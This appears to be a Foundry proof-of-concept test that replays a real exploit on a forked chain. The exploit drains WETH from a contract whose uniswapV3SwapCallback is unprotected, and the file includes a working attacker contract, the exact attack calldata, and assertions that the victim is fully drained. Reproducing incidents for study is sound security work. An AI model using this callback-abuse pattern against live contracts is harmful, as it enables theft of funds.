pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : $1.7k
// Attacker : https://etherscan.io/address/0xf073a21f0d68adacfff34d5b8df04550c944e348
// Attack Contract : https://etherscan.io/address/0xd683b81c2608980db90a6fd730153e04629ff1a3
// Vulnerable Contract : https://etherscan.io/address/0x03f911aedc25c770e701b8f563e8102cfacd62c0
// Attack Tx : https://etherscan.io/tx/0x1a3e9eb5e00f39e84f90ca23bd851aa194b1e7a90003e3f6b9b17bbb66dabbb9

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x03f911aedc25c770e701b8f563e8102cfacd62c0

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1834488796953673862
// Twitter Guy : https://x.com/TenArmorAlert/status/1834488796953673862
// Hacking God : N/A

address constant weth9 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant vul_contract = 0x03F911AeDc25c770e701B8F563E8102CfACd62c0;
address constant attacker = 0xf073a21f0D68aDaCfff34D5b8DF04550c944e348;
// `addr2` was undefined in the original PoC (relied on a missing global constant).
// The attack calls uniswapV3SwapCallback on the vulnerable contract, so addr2 == vul_contract.
address constant addr2 = 0x03F911AeDc25c770e701B8F563E8102CfACd62c0;

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8545", 20737848);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", address(attacker).balance, 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        // deal(address(attC), 0.7370354703656878 ether); // give only ether
        deal(weth9, address(attC), 737035470365687849); // give WETH
        attC.attack();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", address(attacker).balance, 18);
    }

    // Faithful reproduction that PROVES the harm against the LIVE victim contract:
    // it does NOT pre-fund the attacker with deal(); instead it invokes the victim's
    // unprotected uniswapV3SwapCallback with the EXACT calldata from the real attack tx
    // and asserts the victim's entire WETH balance is drained to the attacker.
    function testRealDrain() public {
        uint256 victimBefore = IWETH9(weth9).balanceOf(vul_contract);
        emit log_named_decimal_uint("victim WETH before", victimBefore, 18);
        assertEq(victimBefore, 737035470365687848, "victim should hold 0.737 WETH");

        address realAttackContract = 0xD683B81c2608980DB90a6fD730153e04629ff1A3;
        uint256 attackerBefore = IWETH9(weth9).balanceOf(realAttackContract);

        // Exact calldata replayed from on-chain attack tx:
        //   uniswapV3SwapCallback(int256 amount0, int256 amount1, bytes data)
        //   amount0 = 737035470365687848  (positive => pool "owes" this much WETH to recipient)
        //   amount1 = -18035979692517947  (negative, ignored by the buggy handler)
        //   data    = abi.encode(WETH, recipient=realAttackContract, fee=10000)
        bytes memory data = abi.encode(weth9, realAttackContract, uint256(10000));
        vm.prank(realAttackContract, realAttackContract);
        (bool ok,) = vul_contract.call(
            abi.encodeWithSelector(
                bytes4(keccak256("uniswapV3SwapCallback(int256,int256,bytes)")),
                int256(737035470365687848),
                int256(-18035979692517947),
                data
            )
        );
        require(ok, "real callback failed");

        uint256 victimAfter = IWETH9(weth9).balanceOf(vul_contract);
        uint256 attackerAfter = IWETH9(weth9).balanceOf(realAttackContract);
        emit log_named_decimal_uint("victim WETH after", victimAfter, 18);
        emit log_named_decimal_uint("attacker WETH gained", attackerAfter - attackerBefore, 18);

        // HARM: victim fully drained; attacker received the stolen WETH.
        assertEq(victimAfter, 0, "victim WETH must be fully drained");
        assertEq(attackerAfter - attackerBefore, 737035470365687848, "attacker must receive the drained WETH");
    }
}

// 0xD683B81c2608980DB90a6fD730153e04629ff1A3
contract AttackerC {
    receive() external payable {}

    function attack() public {
        bytes memory data = abi.encode(
            address(weth9),
            address(this),
            uint256(10000)
        );
        (bool ok, ) = addr2.call(
            abi.encodeWithSelector(
                bytes4(keccak256("uniswapV3SwapCallback(int256,int256,bytes)")),
                int256(737035470365687848),
                int256(-18035979692517947),
                data
            )
        );
        require(ok, "callback failed");

        uint256 bal = IWETH9(weth9).balanceOf(address(this));
        IWETH9(weth9).withdraw(bal - 1);
        // here, we didn't transfer ether to the block.coinbase
        payable(msg.sender).transfer(address(this).balance);
    }
  
    fallback() external payable {}
}

interface IWETH9 {
	function withdraw(uint256) external;
	function balanceOf(address) external view returns (uint256); 
}